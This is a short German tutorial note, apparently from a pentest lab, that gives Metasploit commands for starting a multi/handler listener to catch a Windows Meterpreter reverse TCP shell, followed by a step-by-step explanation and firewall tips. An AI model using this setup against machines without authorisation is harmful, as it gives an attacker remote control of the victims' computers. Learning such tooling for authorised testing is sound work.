# Start Metapreter Console

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.53.197
set LPORT 4444
exploit
```

**Erklärung:**

1. **msfconsole starten:** Öffne in Kali Linux ein Terminal und starte Metasploit mit `msfconsole`.
2. **Multi/Handler laden:** Mit `use exploit/multi/handler` wechselst du in den entsprechenden Modus, um auf eingehende Verbindungen zu warten.
3. **Payload festlegen:** Mit `set PAYLOAD windows/meterpreter/reverse_tcp` legst du den Payload fest. (Falls du einen anderen Payload verwendest – z. B. für Linux – musst du diesen entsprechend anpassen.)
4. **Listener konfigurieren:** `set LHOST 192.168.53.197` und `set LPORT 4444` konfigurieren die IP-Adresse und den Port, an dem der Listener Verbindungen erwartet.
5. **Listener starten:** Mit `exploit` startest du den Listener. Sobald dein Testgerät den Payload ausführt, sollte sich eine Meterpreter-Shell öffnen.

Achte darauf, dass etwaige Firewalleinstellungen den Zugriff auf Port 4444 nicht blockieren und der Payload zu deiner Zielplattform passt.
